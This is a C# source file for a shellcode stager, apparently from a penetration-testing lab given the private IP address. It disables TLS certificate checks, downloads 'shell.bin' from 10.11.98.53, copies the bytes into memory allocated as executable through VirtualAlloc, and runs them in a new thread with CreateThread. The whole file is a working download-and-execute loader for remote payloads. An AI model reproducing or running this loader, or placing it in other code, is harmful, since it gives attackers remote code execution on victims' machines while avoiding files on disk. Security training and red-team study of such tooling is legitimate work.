//1
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

public class Program {
  [DllImport("kernel32")]
  static extern IntPtr VirtualAlloc(int lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  private static uint MEM_COMMIT = 0x1000;
  private static uint PAGE_EXECUTE_READWRITE = 0x40;



  public static void Main(){
    string url = "http://10.11.98.53/shell.bin";
    Stager(url);
  }

  public static void Stager(string url){

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);


    Console.WriteLine("shellcode: ");
    for (int i = 0; i < shellcode.Length; i++){
      Console.Write("0x{0:X2} , ", shellcode[i]);
    }
    Console.WriteLine("");

    IntPtr  codeAddr = VirtualAlloc(0, (uint)(shellcode.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Console.WriteLine("Code Address: 0x{0:X8}",codeAddr);


    Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);

    Console.WriteLine("shell code at 0x{0:X8}: ",codeAddr);  
    byte value=0;
    for (int i = 0; i < shellcode.Length; i++){
      value = Marshal.ReadByte(codeAddr, i);
      Console.Write("0x{0:X2} , ", value);
    }
    Console.WriteLine("");


    IntPtr threadHandle = IntPtr.Zero;
    IntPtr threadId = IntPtr.Zero;
    IntPtr parameter = IntPtr.Zero;

    threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, parameter, 0, threadId);

    if (threadHandle == IntPtr.Zero) {
        Console.WriteLine("CreateThread failed");
    }
    Thread.Sleep(2000);

  }
}